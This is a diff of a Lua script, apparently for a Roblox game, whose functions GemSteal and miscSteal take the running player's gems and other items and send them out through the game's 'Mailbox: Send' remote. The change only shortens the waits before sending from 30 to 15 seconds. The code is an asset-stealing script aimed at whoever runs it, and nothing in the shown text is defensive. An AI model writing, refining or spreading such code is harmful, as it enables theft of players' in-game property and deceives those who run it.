@@ -14,7 +14,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
 end
 
 if GemAmount1 < 30000000 then
-    task.wait(30)
+    task.wait(15)
     waited = true
     game.ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
     task.wait(1)
@@ -33,7 +33,7 @@ local function GemSteal()
                         [5] = GemAmount1 - 40000000
                     }
                if waited == false then
-                    task.wait(30)
+                    task.wait(15)
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                 else
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
@@ -53,7 +53,7 @@ local function miscSteal()
                 [5] = v._am
             }
                 if waited == false then
-                    task.wait(30)
+                    task.wait(15)
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                 else
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
